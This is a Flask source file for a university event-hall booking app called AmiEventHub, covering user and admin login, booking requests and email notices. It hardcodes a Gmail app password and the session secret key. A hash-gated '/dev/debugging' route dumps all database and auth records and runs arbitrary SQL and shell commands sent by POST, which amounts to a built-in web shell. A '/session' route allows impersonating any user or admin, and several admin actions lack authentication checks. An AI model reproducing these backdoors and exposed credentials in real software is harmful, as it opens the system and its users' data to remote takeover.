##main flask app :: Shahil kadia 
#Set-ExecutionPolicy Unrestricted CurrentUser;.\.venv\Scripts\activate;
# Description: This file contains the main code for the AmiEventHub application.# -*- coding: utf-8 -*-
import os
import random
from datetime import datetime
from datetime import timedelta
import threading
from flask import *
from flask import jsonify, request, send_from_directory
from flask_mail import Mail, Message
from werkzeug.utils import secure_filename
from subprocess import run
import dbscript as db         #FOR SQL SERVER DATABASE
import loginscript as login   #FOR SQL SERVER DATABASE

#import dbscriptlite as db        #FOR SQLITE DATABASE
#import loginscriptlite as login  #FOR SQLITE DATABASE

app = Flask(__name__,
            static_url_path='', 
            static_folder='web/static',
            template_folder='web/templates') 
app.secret_key =  "AMITY_792739"   # Replace with and random key
app.config['SECRET_KEY'] = "AMITY_792739"  # Replace with and random key
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'amieventhub@gmail.com'  # Replace with your email
app.config['MAIL_PASSWORD'] = 'ffoi rhgz arbn gnaw'  # Replace with your email password
app.config['MAIL_DEFAULT_SENDER'] = 'amieventhub@gmail.com'  # Replace with your email
admin_email = 'amieventhub@gmail.com'  # Replace with the admin's email
it_email = 'amieventhub@gmail.com'  # Replace with the admin's email
mail = Mail(app)
server_link = "http://127.0.0.1:8000" #replace with production server initial routing address.

#task-related functions
def hallname(hallid:int):
    l = [0,"Auditorium Hall","Seminar Hall","Room No. 105, A2 Building","CRC Conference Room","AIIT Conference Room","RICS Conference Room","Atrium"]
    #l = [0,'auditorium','seminar','room105','crc']
    return (l[hallid])

def hallid(hallname:str):
    l = [0,'auditorium','seminar','room105','crc','AIITConferenceroom','RICSConferenceRoom','Atrium']
    return (l.index(hallname))

def trimtime(time:str):
    a = time.split(':')
    c = ""
    for i in a:
        c = c + i
    return int(c)

def maketime(time):
    time = int(time)
    if len(str(time))==3:
        time = "0"+str(time)
        time = time[:2]+":"+time[2:]
        return time
    else:
        time=str(time)
        time = time[:2]+":"+time[2:]
        return time

#db task functions
def get_sorted_status():
    out = db.all_status()
    final = []
    final2 = []
    for i in out:
        i = list(i)
        if i[1] == 'pending':
            final.append(i)
        elif i[1] == 'reject':
            i[1] = "rejected"
            final.append(i)
        else:
            i[1] = "accepted"
            final.append(i)
    #return final  #then use db.infofect for each bid.
    for i in final:
        bid = i[0]
        status = str(i[1]).upper()
        o = db.info_fetch(bid)
        final2.append([o,status])
    return final2

def get_sorted_status2():
    out = db.all_status()
    final = []
    final2 = []
    for i in out:
        if i[1] == 'pending':
            final.append(i)
        elif i[1] == 'reject':
            pass
        else:
            final.append(i)
    #return final  #then use db.infofect for each bid.
    for i in final:
        bid = i[0]
        status = str(i[1]).upper()
        o = db.info_fetch(bid)
        final2.append([o,status])
    # print(final2)
    return final2[::-1]  #reverse the order for latest first

# global code_list
code_list = []

def gen_code():
    # global code_list
    code = random.randint(101,199999)
    if code not in code_list:
        code_list.append(code)
    else:
        code = gen_code()
    return code

def getduration(etime):
    if etime==1300 or etime=="1300":
        etime = "1st Half"
    elif etime==1700 or etime=="1700":
        etime= "2nd Half"
    elif etime==1701 or etime=="1701":
        etime= "Full Day"
    return etime

def send_mail(event_name,event_venue,event_date,start_time,end_time,school_name,hoi_name,resource_person_name,resource_person_details,faculty_phone,faculty_name,faculty_email,bid):
    
    html = f"""<pre>
    Dear Sir,

    I hope this message finds you well.

    I am writing to request your permission to conduct an event titled "{event_name}" at {event_venue} on {event_date} from {maketime(start_time)} to {maketime(end_time)}. Below are the details of the event:
    <form>
    <table>
        <thead>
            <tr>
                <th>Booking ID</th>
                <th>    </th>
                <th>Hall Name</th>
                <th>    </th>
                <th>Date</th>
                <th>    </th>
                <th>School</th>
                <th>    </th>
                <th>Event Name</th>
                <th>    </th>
                <th>Start Time</th>
                <th>    </th>
                <th>End Time</th>
                <th>    </th>
                <th>Status</th>
                <th>    </th>
                <th>Edit</th>
            </tr>
        </thead>

        <tr>
            <td>    {bid}</td>
            <td>    </td>
            <td>{event_venue}</td>
            <td>    </td>
            <td>{event_date}</td>
            <td>    </td>
            <td>{school_name}</td>
            <td>    </td>
            <td>{event_name}</td>
            <td>    </td>
            <td>{maketime(start_time)}</td>
            <td>    </td>
            <td>{maketime(end_time)}</td>
            <td>    </td>
            <td>Pending</td>
            <td>    </td>
            <td><a href='{server_link}/admin/email/approve/{bid}'>Approve</a>|<a href='{server_link}/admin/email/reject/{bid}'>Reject</a></td>
        </tr>
    </table>
    </form>

    • School Name: {school_name}
    • Head of Institution/Director Name: {hoi_name}
    • Resource Person Name: {resource_person_name}
    • Resource Person Details: {resource_person_details}
    • Name of Event Coordinator: {faculty_name}
    • Phone Number of Event Coordinator: {faculty_phone}
    • Email of Event Coordinator: {faculty_email}
    • Booking ID : {bid}
    • Event Venue: {event_venue}
    • Event Date: {event_date}
    • Duration: {maketime(start_time)} to {maketime(end_time)}

    We believe that this event will provide significant value and insights to our attendees, fostering an environment of learning and engagement.

    For your convenience, please click on the link below to visit AmiEventHUB and grant us permission to organize this event.

    Shortcut Links:

        Admin Page :  <a href='{server_link}/admin'>Login Link</a>
    
        Approve Request :    <a href='{server_link}/admin/email/approve/{bid}'>Approve</a>
    
        Reject Request :     <a href='{server_link}/admin/email/reject/{bid}'>Reject</a>
                    
    Best regards,
    {faculty_name}
    {school_name}
    {faculty_email}
    
    [This mail is computer generated by AmiEventHub.]</pre>
    """
    # Send the email
    try:
        msg = Message(subject=f'Request for Permission to Conduct an Event: {event_name} at {event_date}', recipients=[admin_email])
        # msg.body = email_body
        msg.html = html
        @copy_current_request_context
        def send_message(message):
            mail.send(message)
        sender = threading.Thread(name='mail_sender', target=send_message, args=(msg,))
        sender.start()
        # mail.send(msg)
        return True
    except Exception as e:
        print(e)
        return False

def send_mail2(event_name,event_venue,event_date,start_time,end_time,school_name,resource_person_name,resource_person_details,status,user_email,bid):
    
    html = f"""<pre>
    Dear Faculty,

    I hope this message finds you well.

    The request for permission to conduct an event titled "{event_name}" at {event_venue} on {event_date} from {maketime(start_time)} to {maketime(end_time)}. Below are the details of the event:
    • School Name: {school_name}
    • Resource Person Name: {resource_person_name}
    • Resource Person Details: {resource_person_details}
    • Email of Event Coordinator: {user_email}
    • Booking ID : {bid}
    • Event Venue: {event_venue}
    • Event Date: {event_date}
    • Duration: {maketime(start_time)} to {maketime(end_time)}
    

    Your Request has been {status} by the Admin. 

    Kindly check for more details in status section of AmiEventHub.For your convenience, please click on the link below to visit AmiEventHUB
    
    Shortcut Links:

        User Page :  <a href='{server_link}/user'>Login Link</a>

    Best regards,
    AmiEventHub
    
    [This mail is computer generated by AmiEventHub.]</pre>"""
    # Send the email
    try:
        msg = Message(subject=f'Response to Event: {event_name} Permission at {event_date}', recipients=[user_email])
        # msg.body = email_body
        msg.html = html
        @copy_current_request_context
        def send_message(message):
            mail.send(message)
        sender = threading.Thread(name='mail_sender', target=send_message, args=(msg,))
        sender.start()
        # mail.send(msg)
        return True
    except Exception as e:
        print(e)
        return False

def send_mail4(event_name,event_venue,event_date,start_time,end_time,school_name,resource_person_name,resource_person_details,status,user_email,bid):
    
    html = f"""<pre>
    Dear IT Department,

    I hope this message finds you well.

    The request for permission to conduct an event titled "{event_name}" at {event_venue} on {event_date} from {maketime(start_time)} to {maketime(end_time)}. Below are the details of the event:
    <form>
    <table>
        <thead>
            <tr>
                <th>Booking ID</th>
                <th>    </th>
                <th>Hall Name</th>
                <th>    </th>
                <th>Date</th>
                <th>    </th>
                <th>School</th>
                <th>    </th>
                <th>Event Name</th>
                <th>    </th>
                <th>Start Time</th>
                <th>    </th>
                <th>End Time</th>
                <th>    </th>
                <th>Status</th>
                <th>    </th>
                <th>Edit</th>
            </tr>
        </thead>

        <tr>
            <td>    {bid}</td>
            <td>    </td>
            <td>{event_venue}</td>
            <td>    </td>
            <td>{event_date}</td>
            <td>    </td>
            <td>{school_name}</td>
            <td>    </td>
            <td>{event_name}</td>
            <td>    </td>
            <td>{maketime(start_time)}</td>
            <td>    </td>
            <td>{maketime(end_time)}</td>
            <td>    </td>
            <td>Pending</td>
            <td>    </td>
            <td><a href='{server_link}/admin/email/approve/{bid}'>Approve</a>|<a href='{server_link}/admin/email/reject/{bid}'>Reject</a></td>
        </tr>
    </table>
    </form>

    • School Name: {school_name}
    • Resource Person Name: {resource_person_name}
    • Resource Person Details: {resource_person_details}
    • Email of Event Coordinator: {user_email}
    • Booking ID : {bid}
    • Event Venue: {event_venue}
    • Event Date: {event_date}
    • Duration: {maketime(start_time)} to {maketime(end_time)}
    

    The Request has been {status} by the Admin. 

    Kindly check for more details in AmiEventHub.For your convenience, please click on the link below to visit AmiEventHUB
    
    Shortcut Links:

        Login Page :  <a href='{server_link}'>Login Link</a>

    Best regards,
    AmiEventHub
    
    [This mail is computer generated by AmiEventHub.]</pre>"""
    # Send the email
    try:
        msg = Message(subject=f'New Event: {event_name} dated {event_date}', recipients=[it_email])
        # msg.body = email_body
        msg.html = html
        @copy_current_request_context
        def send_message(message):
            mail.send(message)
        sender = threading.Thread(name='mail_sender', target=send_message, args=(msg,))
        sender.start()
        # mail.send(msg)
        return True
    except Exception as e:
        print(e)
        return False

def send_mail5(event_name,event_venue,event_date,start_time,end_time,school_name,status,bid):
    
    html = f"""<pre>
    Dear IT Department,

    I hope this message finds you well.

    The request for permission to conduct an event titled "{event_name}" at {event_venue} on {event_date} from {maketime(start_time)} to {maketime(end_time)}. Below are the details of the event:
    <form>
    <table>
        <thead>
            <tr>
                <th>Booking ID</th>
                <th>    </th>
                <th>Hall Name</th>
                <th>    </th>
                <th>Date</th>
                <th>    </th>
                <th>School</th>
                <th>    </th>
                <th>Event Name</th>
                <th>    </th>
                <th>Start Time</th>
                <th>    </th>
                <th>End Time</th>
                <th>    </th>
                <th>Status</th>
                <th>    </th>
                <th>Edit</th>
            </tr>
        </thead>

        <tr>
            <td>    {bid}</td>
            <td>    </td>
            <td>{event_venue}</td>
            <td>    </td>
            <td>{event_date}</td>
            <td>    </td>
            <td>{school_name}</td>
            <td>    </td>
            <td>{event_name}</td>
            <td>    </td>
            <td>{maketime(start_time)}</td>
            <td>    </td>
            <td>{maketime(end_time)}</td>
            <td>    </td>
            <td>Pending</td>
            <td>    </td>
            <td><a href='{server_link}/admin/email/approve/{bid}'>Approve</a>|<a href='{server_link}/admin/email/reject/{bid}'>Reject</a></td>
        </tr>
    </table>
    </form>
    • School Name: {school_name}
    • Booking ID : {bid}
    • Event Venue: {event_venue}
    • Event Date: {event_date}
    • Duration: {maketime(start_time)} to {maketime(end_time)}
    

    The Request has been CANCELLED by the USER. 

    Kindly check for more details in AmiEventHub.For your convenience, please click on the link below to visit AmiEventHUB
    
    Shortcut Links:

        Login Page :  <a href='{server_link}'>Login Link</a>

    Best regards,
    AmiEventHub
    
    [This mail is computer generated by AmiEventHub.]</pre>"""
    # Send the email
    try:
        msg = Message(subject=f'Cancel Event: {event_name} dated {event_date}', recipients=[it_email])
        # msg.body = email_body
        msg.html = html
        @copy_current_request_context
        def send_message(message):
            mail.send(message)
        sender = threading.Thread(name='mail_sender', target=send_message, args=(msg,))
        sender.start()
        # mail.send(msg)
        return True
    except Exception as e:
        print(e)
        return False

def send_mail3(user_email,code):
    html = f"""
    <pre>
    Dear Faculty,

    I hope this message finds you well.

    Your Verification code for {user_email} is {code}.

    Best regards,
    AmiEventHub

    [This mail is computer generated by AmiEventHub.]
    </pre>
    """

    # Send the email
    try:
        msg = Message(subject='Email Verification by AmiEventHub', recipients=[user_email])
        # msg.body = email_body
        msg.html = html
        @copy_current_request_context
        def send_message(message):
            mail.send(message)
        sender = threading.Thread(name='mail_sender', target=send_message, args=(msg,))
        sender.start()
        # mail.send(msg)
        return True
    except Exception as e:
        print(e)
        return False

#context functions
@app.context_processor
def utility_processor():
    def make_time(time:int):
        if str(time)=="0":
            return "00:00"
        if len(str(time))==3:
            time = "0"+str(time)
            time = time[:2]+":"+time[2:]
            return time
        else:
            time=str(time)
            time = time[:2]+":"+time[2:]
            return time
    return dict(make_time=make_time)

@app.context_processor
def utility_processor():
    def getduration(etime):
        if etime==1300 or etime=="1300":
            etime = "1st Half"
        elif etime==1700 or etime=="1700":
            etime= "2nd Half"
        elif etime==1701 or etime=="1701":
            etime= "Full Day"
        return etime
    return dict(getduration=getduration)
@app.context_processor
def utility_processor():
    def hallname(hallid:int):
        l = [0,"Auditorium Hall","Seminar Hall","Room No. 105, A2 Building","CRC Conference Room","AIIT Conference Room","RICS Conference Room","Atrium"]
        #l = [0,'auditorium','seminar','room105','crc']
        return (l[hallid])
    return dict(hallname=hallname)

#before-request functions
@app.before_request
def make_session_permanent():
    session.permanent = True
    app.permanent_session_lifetime = timedelta(minutes=60) #session timeout after 60 minutes.

#routing functions
@app.route('/')
def home():
    #session['username'] = "TEST"
    return render_template("front.html")

@app.route('/alert')
def alert():
    #error="Your Request has been successfully sent!"
    error = send_mail('event_name','event_venue','event_date','900','1100','school_name','hoi_name','resource_person_name','resource_person_details','faculty_phone','faculty_name','faculty_email',0)
    print(error)
    return render_template("test1.html",error=error)

@app.route('/user' ,methods=['GET', 'POST'])
def index():
    error = None
    try:
        if session:
            uname = session['username']
            print(uname)
            cal = db.calender()
            print("CAL:",cal)
            if request.method == 'POST':
                
                hall = ['auditorium','seminar','room105','crc','AIITConferenceroom','RICSConferenceRoom','Atrium']
                place = ['SchoolName','FacultyName','HodName','EventName','date','startime','endtime','Email','Phone','ResourcePersonName','ResourcePersonDetail']
                final=[]
                loc = ''
                for i in hall:
                    for j in place:
                        try:
                            f = i+j
                            #print(f)
                            final.append(request.form[f])
                            loc = i
                        except KeyError as e:
                            print(e)
                # final[5] = trimtime(final[5])
                # final[6] = trimtime(final[6])
                # if (final[5] == "1stHalf"):
                #     final[5] = 900
                #     final[6] = 1300
                # elif (final[5] == "2ndHalf"):
                #     final[5] = 1400
                #     final[6] = 1700
                # elif (final[5] == "fullDay"):
                #     final[5] = 900
                #     final[6] = 1701

                hid = hallid(loc)
                
                # print(final)
                #print('location = ',hallid(loc))
                if db.check_hall(hid,final[4],final[5],final[6]):
                    bid = db.request_hall(hid,final[0],final[4],final[5],final[6],final[3],uname)
                    db.info_dump(bookid=bid, hallid=hid , school=final[0], fname=final[1], hod=final[2], email=final[7] , phone=final[8] , date=final[4] , stime=final[5] , etime=final[6] , event=final[3],rpname=final[9],rpdetail=final[10])
                    #db.info_dump(bid, hid , sfinal[0], final[1], final[2],final[7] , final[8] , final[4] , final[5] , final[6] , final[3])
                    if (send_mail(final[3],hallname(hid),final[4],final[5],final[6],final[0],final[2],final[9],final[10],final[8],final[1],final[7],bid)):
                        
                        error = "Your Request Is Successfully Sent for Approval!"
                        return render_template("index.html",error=error,cal=cal)
                    else:
                        error=f"Email not sent to Admin due to server issue. But request is sent please send an email manually to {admin_email}."
                        return render_template("index.html",error=error,cal=cal)
                else:
                    error = "Hall Not Available At given Date and Time."
                    return render_template("index.html",error=error,cal=cal)
            
            return render_template("index.html",error=error,cal=cal)
        else:
            return redirect(url_for('userlogin'))
    except Exception as e:
        print(e)
        return redirect(url_for('userlogin'))

@app.route('/requeststatus' ,methods=['GET', 'POST'])
def status():
    if request.method == 'POST':
        try:
            if session['username']:
                username = session['username']
                print("METHOD ACTIVATE")
                bid = request.form["booking_id"]
                status = request.form["status"]
                event_venue = request.form["hall_name"]
                event_date = request.form['date']
                start_time = request.form['start_time']
                end_time = request.form['end_time']
                event_name = request.form['ename']
                school_name = request.form['sname']
                print(bid,status)
                if db.reject_app(bid=int(bid),status=status):
                    error = "Venue hall request Cancelled Successfully."
                    send_mail5(event_name,event_venue,event_date,start_time,end_time,school_name,status,bid)
                    output = db.check_request(username)
                    return render_template("statuspage.html",output=output,error=error)
                else:
                    error = "Error : Venue hall request NOT Cancelled. Please retry again."
                    output = db.check_request(username)
                    return render_template("statuspage.html",output=output,error=error)
            else:
                return redirect(url_for('userlogin'))
        except Exception as e:
            print(e)
            error = "Request in Process. Please wait and reload page if not reflected."
            output = db.check_request(username)
            return render_template("statuspage.html",output=output,error=error)
        
    if session['username']:
        username = session['username']
        output = db.check_request(username)
        # print(output)
        # for i in output:
        #     if i[5]==1300 or i[5]=="1300":
        #         i[5] = "1st Half"
        #     elif i[5]==1700 or i[5]=="1700":
        #         i[5]= "2nd Half"
        #     elif i[5]==1701 or i[5]=="1701":
        #         i[5]= "Full Day"
        error = None
        return render_template("statuspage.html",output=output,error=error)
    else:
        return redirect(url_for('userlogin'))
        
@app.route('/admin' ,methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        bid = request.form["bookingId"]
        status = request.form["confirmEvent"]
        event_name = request.form["eventName"]
        event_venue = request.form["venue"]
        event_date = request.form["eventDate"]
        start_time = request.form["stime"]
        end_time = request.form["etime"]
        # if event_dur == "1st Half":
        #     start_time = "900"
        #     end_time = "1300"
        # elif event_dur == "2st Half":
        #     start_time = "1400"
        #     end_time = "1700"
        # elif event_dur == "Full Day":
        #     start_time = "900"
        #     end_time = "1701"
        school_name = request.form["schoolName"]
        resource_person_name = request.form["resourcePersonName"]
        resource_person_details = request.form["resourcePersonDetail"]
        facultyEmail = request.form["facultyEmail"]
        # print(bid , status)
        if status=="ACCEPT":
            try:
                db.confirm_hall(bid)
                status2 = "ACCEPTED"
                send_mail2(event_name,event_venue,event_date,start_time,end_time,school_name,resource_person_name,resource_person_details,status2,facultyEmail,bid)
                send_mail4(event_name,event_venue,event_date,start_time,end_time,school_name,resource_person_name,resource_person_details,status2,facultyEmail,bid)                
                return redirect(url_for('admin'))
            except:
                return redirect(url_for('admin'))
        elif status=="REJECT":
            try:
                db.reject_hall(bid)
                status2 = "REJECTED"
                send_mail2(event_name,event_venue,event_date,start_time,end_time,school_name,resource_person_name,resource_person_details,status2,facultyEmail,bid)
                return redirect(url_for('admin'))
            except:
                return redirect(url_for('admin'))
    try:
        if session['admin_username']:
            username = session['admin_username']
            if (username.split("+")[0]=='ADMIN'):
                # print("ACCEPTEd")
                output1 = db.check_pending()
                # print(output1)
                output = []
                for i in output1:
                    output2 = db.info_fetch(i[0])
                    #output2[0][1] = hallname(output2[0][1])
                    output.append(output2)
                final = []
                for i in output:
                    j = list(i[0])
                    final.append(j)
                # print(final)
                # print(len(output[0]))
                for j in final:
                    i = j
                    # print("i value = ",i)
                    # print('i8 = ',i[8])
                    # if i[8]==1300 or i[8]=="1300":
                    #     # print('trigg')
                    #     i[8] = "1st Half"
                    # elif i[8]==1700 or i[8]=="1700":
                    #     i[8]= "2nd Half"
                    # elif i[8]==1701 or i[8]=="1701":
                    #     i[8]= "Full Day"
                # print(final)
                return render_template("admintable.html",output=final)
            else:
                return redirect(url_for('adminlogin'))
        else:
            return redirect(url_for('adminlogin'))
 
        return redirect(url_for('adminlogin'))
    except Exception as e:
        print(e)
        return redirect(url_for('adminlogin'))

@app.route('/login' ,methods=['GET', 'POST'])
def userlogin():
    error = None
    session.pop('username',None)
    if request.method == 'POST':
        username = request.form["user-username"]
        passwd = request.form["user-password"]
        #print(username,passwd)
        if login.load_user(username,passwd) == True:
            session['username'] = username
            return redirect(url_for('index'))
        else:
            if login.load_user(username,passwd) == "verify":
                email = login.getname_user(username)
                #send_mail3(email,gen_code())
                return redirect(url_for('userlogin'))
            else:
                error = "Incorrect Credentials!"
                return render_template('loginuser.html',error=error)
    return render_template('loginuser.html',error=error)

@app.route('/signup' ,methods=['GET', 'POST'])
def usersignup():
    alert = None
    session.pop('username',None)
    if request.method == 'POST':
        username = request.form["user-username"]
        passwd = request.form["user-password"]
        email = request.form["user-email"]
        
        if (email.split("@")[-1]!="mum.amity.edu"):
            alert = 'Please use a valid @mum.amity.edu email address for signup.'
            return render_template('signup.user.html',error=alert)
        else:
            #return redirect(url_for('verifyemail',username=username,password=passwd))
            if login.create_user(username=username,password=passwd,name=email):
                print(username,passwd,email)
                #send_mail3(email,gen_code())
                #return redirect(url_for('verifyemail',username=username))
                return redirect(url_for('userlogin',username=username))
            else:
                alert = 'Account creation failed. Select different username and Please try again later.'
                return render_template('signup.user.html',error=alert)
        
    # return render_template('signup.user.html',error=alert)
    return redirect(url_for('userlogin'))

@app.route('/adminlogin' ,methods=['GET', 'POST'])
def adminlogin():
    error = None
    session.pop('admin_username',None)
    if request.method == 'POST':
        username = request.form["admin-username"]
        passwd = request.form["admin-password"]
        #print(username,passwd)
        if login.load_admin(username,passwd):
            adname = "ADMIN+"+username
            session['admin_username'] = adname
            # print("here")
            return redirect(url_for('admin'))
        else:
            error = "Incorrect Credentials!"
            return render_template('loginadmin.html',error=error)
    return render_template('loginadmin.html',error=error)

@app.route('/adminsignup' ,methods=['GET', 'POST'])
def adminsignup():
    alert = None
    session.pop('admin_username',None)
    if request.method == 'POST':
        username = request.form["admin-username"]
        passwd = request.form["admin-password"]
        email = request.form["admin-email"]
        
        if (email.split("@")[-1]!="mum.amity.edu"):
            alert = 'Please use a valid @mum.amity.edu email address for signup.'
            return render_template('signup.admin.html',error=alert)
        else:
            #return redirect(url_for('verifyemail',username=username,password=passwd))
            if login.create_admin(username=username,password=passwd,name=email):
                print(username,passwd,email)
                return redirect(url_for('adminlogin'))
            else:
                alert = 'Account creation failed. Select different username and Please try again later.'
                return render_template('signup.admin.html',error=alert)
        
    # return render_template('signup.admin.html',error=alert)
    return redirect(url_for('adminlogin'))

@app.route('/admin/bookings',methods=['GET'])
def adminbooking():
    if session:
        try:
            username = session['admin_username']
            output = get_sorted_status()
            print(output)
            return render_template('allbooking.html',output=output)
        except Exception as e :
            print(e)
            return render_template('notitab.html',error="You have been logged out of Admin. Please Login again.")
    else:
        return render_template('notitab.html',error="You have been logged out of Admin. Please Login again.")

#email get requests (admin):
@app.route('/admin/email/approve/<bookid>',methods=['GET'])
def admingetapprove(bookid):
    bookid = int(bookid)
    if db.confirm_hall(bookid):
        o = db.info_fetch(bookid)
        event_name = o[0][5]
        event_venue = hallname(int(o[0][1]))
        event_date = o[0][6]
        start_time = o[0][7]
        end_time = o[0][8]
        school_name = o[0][2]
        resource_person_name = o[0][11]
        resource_person_details = o[0][12]
        facultyEmail = o[0][9]
        status2 = "ACCEPTED"
        send_mail2(event_name,event_venue,event_date,start_time,end_time,school_name,resource_person_name,resource_person_details,status2,facultyEmail,bookid)
        send_mail4(event_name,event_venue,event_date,start_time,end_time,school_name,resource_person_name,resource_person_details,status2,facultyEmail,bookid)
        error=f"Booking Number: {bookid}. Request APPROVED successfully."
        return render_template('closetab.html',error=error)
    else:
        error=f"Booking Number: {bookid}. Request to server Failed. Please Contact Technical Team if Problem Presists"
        return render_template('closetab.html',error=error)

@app.route('/admin/email/reject/<bookid>',methods=['GET'])
def admingetreject(bookid):
    bookid = int(bookid)
    if db.reject_hall(bookid):
        o = db.info_fetch(bookid)
        event_name = o[0][5]
        event_venue = hallname(int(o[0][1]))
        event_date = o[0][6]
        start_time = o[0][7]
        end_time = o[0][8]
        school_name = o[0][2]
        resource_person_name = o[0][11]
        resource_person_details = o[0][12]
        facultyEmail = o[0][9]
        status2 = "REJECTED"
        send_mail2(event_name,event_venue,event_date,start_time,end_time,school_name,resource_person_name,resource_person_details,status2,facultyEmail,bookid)
        error=f"Booking Number: {bookid}. Request DISAPPROVED successfully."
        return render_template('closetab.html',error=error)
    else:
        error=f"Booking Number: {bookid}. Request to server Failed. Please Contact Technical Team if Problem Presists"
        return render_template('closetab.html',error=error)

@app.route('/session/<s>',methods=['GET'])
def createsession(s):
    try:
        if session:
            if session['debug'] == "TRUE":
                session['admin_username'] = "ADMIN+"+s
                session['username'] = s 
                return render_template('debugger.html')
            else:
                return redirect(url_for('home'))
    except Exception as e:
        return jsonify(error=str(e))


@app.route('/destroysession',methods=['GET'])
def destroysession():
    if session['debug'] == "TRUE":
        session.pop('username',None)
        session.pop('admin_username',None)
        session.pop('debug',None)
        return redirect(url_for('home'))
    else:
        return redirect(url_for('home'))

@app.route('/getsession',methods=['GET'])
def getsession():
    if session:
        admin = None
        user = None
        debug = None
        extra = None
        try:
            admin = session['admin_username']
        except:
            pass
        try:
            user = session['username']
        except:
            pass
        try:
            debug = session['debug']
        except:
            pass
        finally:
            for i in session:
                extra = {i :session[i]}
        return jsonify(admin=admin,user=user,debug=debug,z=extra)
    else:
        return jsonify(admin=None,user=None,debug=None)

@app.route('/admin/calender',methods=['GET'])
def admincalender():
    output = db.calendermain()
    # print(output)
    for i in output:
        for j in i:
            st = maketime(j[1])
            et = maketime(j[4])
            d = datetime.strptime(st, "%H:%M")
            j[1] = d.strftime("%I %p")
            if j[1][0]=="0":
                j[1]=j[1][1:]
            j[1] = j[1].lower()
            d = datetime.strptime(et, "%H:%M")
            j[4] = d.strftime("%I %p")
            if j[4][0]=="0":
                j[4]=j[4][1:]
            j[4] = j[4].lower()
    # print(output)
    return render_template('calenderadmin.html',output=output)

@app.route('/user/calender',methods=['GET'])
def usercalender():
    output = db.calendermain()
    print(output)
    for i in output:
        for j in i:
            st = maketime(j[1])
            et = maketime(j[4])
            d = datetime.strptime(st, "%H:%M")
            j[1] = d.strftime("%I %p")
            if j[1][0]=="0":
                j[1]=j[1][1:]
            j[1] = j[1].lower()
            d = datetime.strptime(et, "%H:%M")
            j[4] = d.strftime("%I %p")
            if j[4][0]=="0":
                j[4]=j[4][1:]
            j[4] = j[4].lower()
    # print(output)
    return render_template('calenderuser.html',output=output)

@app.route('/admin/notification',methods=['GET'])
def adminnoti():
    if session:
        try:
            username = session['admin_username']
            output = get_sorted_status2()
            return render_template('adminnotification.html',output=output)
        except:
            return render_template('adminnotification.html',error="You have been logged out of Admin. Please Login again.")
    else:
        return render_template('adminnotification.html',error="You have been logged out of Admin. Please Login again.")

@app.route('/user/notification',methods=['GET'])
def usernoti():
    if session:
        try:
            username = session['username']
            output = get_sorted_status2()
            return render_template('usernotification.html',output=output)
        except:
            return render_template('usernotification.html',error="You have been logged out. Please Login again.")
    else:
        return render_template('usernotification.html',error="You have been logged out. Please Login again.")

@app.route('/dev/debugging/<token>',methods=['GET','POST'])
def debug(token):
    og = "13205dbeb3e7cd049a93e18d9fdea3f0"
    us = login.genhash(token)
    if og == us:
        data = db.seeall()
        auth = login.seeall()
        mdata = {'db':data,'auth':auth}
        return jsonify(str(mdata))
    elif us == "ab791314981c430b2b34c0aa36b43ac7":
        session['debug'] = "TRUE"
        if request.method == 'POST':
            dbname = request.form["database"]
            cmd = request.form["command"]
            typeo = request.form["type"]
            # print(dbname,cmd)
            if typeo == "output":
                if dbname == "maindb":
                    output = db.cmd(cmd)
                    # output = json.dumps(output, indent=4)
                    pass      
                elif dbname == "shell":
                    result = run(cmd, capture_output=True,shell=True)
                    b = result.stdout.decode('utf-8')
                    e = result.stderr.decode('utf-8')
                    output = {"DATABASE" :"shell","Command" :cmd,"data": b,"error": e,"type" :type(b),"len" :len(b)}
                    pass
                elif dbname == "logindb":
                    output = login.cmd(cmd)
                    pass
                return render_template('debugger.html',output=output,cmd=cmd,dbname=dbname)
            elif typeo=="json":
                if dbname == "maindb":
                    output = db.cmd(cmd)
                    output['type'].replace("<",'(') 
                    output['type'].replace(">",')') 
                    # output = json.dumps(output, indent=4)
                    pass      
                elif dbname == "shell":
                    result = run(cmd, capture_output=True,shell=True)
                    b = result.stdout.decode('utf-8')
                    e = result.stderr.decode('utf-8')
                    if b:
                        output = {"DATABASE" :"shell", "Command" :{str(cmd)}, "data" :{str(b)}, "type" :str(type(b)), "len" :str(len(b)),}
                    if e:
                        output = {"DATABASE" :"shell", "Command" :{str(cmd)}, "type" :str(type(b)), "len" :str(len(b)), "error": str(e),}
                    pass
                elif dbname == "logindb":
                    output = login.cmd(cmd)
                    pass
                try:
                    return jsonify(output)
                except Exception as e:
                    return f"EXCEPTION :: JSON :: {e} <br>{jsonify(str(output))}<br>{(str(output).replace("'",'"'))}<br>{((output))}"
            else:pass
        else:
            return render_template('debugger.html')
        
    else:
        return "<h1>Not Found</h1><p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.<p>"
    

@app.route('/test',methods=['GET','POST'])
def test():
    if request.method == 'POST':
        print("METHOD ACTIVATE")
        bid = request.form["booking_id"]
        status = request.form["status"]
        print(bid,status)
    if session['username']:
        username = session['username']
        output = db.check_request(username)
        # print(output)
        # for i in output:
        #     if i[5]==1300 or i[5]=="1300":
        #         i[5] = "1st Half"
        #     elif i[5]==1700 or i[5]=="1700":
        #         i[5]= "2nd Half"
        #     elif i[5]==1701 or i[5]=="1701":
        #         i[5]= "Full Day"
        return render_template("test.status.html",output=output)
    else:
        return redirect(url_for('userlogin'))

#futurescope
@app.route('/verifyemail/<username>' ,methods=['GET', 'POST'])
def verifyemail(username):
    # global code_list
    alert = None
    email = login.getname_user(username)
    if request.method == 'POST':
        code = request.form["verification-code"]
        # print(code_list)
        # print(code)
        # print(username)
        if (int(code) in code_list):
            #alert = 'Please use a valid @mum.amity.edu email address for signup.'
            # print(code)    
            state = login.verifyemail(username)
            # print(state)

            if state == True :
                return redirect(url_for('userlogin'))
            else:
                alert = "Incorrect server response entered please try again."
                # print(code)
                # print(code_list)
                return render_template('verifyemail.html',error=alert,email=email)
        else:
            alert = "Incorrect code entered please try again."
            # print(code)
            # print(code_list)
            return render_template('verifyemail.html',error=alert,email=email)
    else:
        return render_template('verifyemail.html',error=alert,email=email)
        
    return render_template('verifyemail.html',error=alert,email=email)


#main runtime
if __name__ == '__main__':
    app.run(debug=True,port=8000)
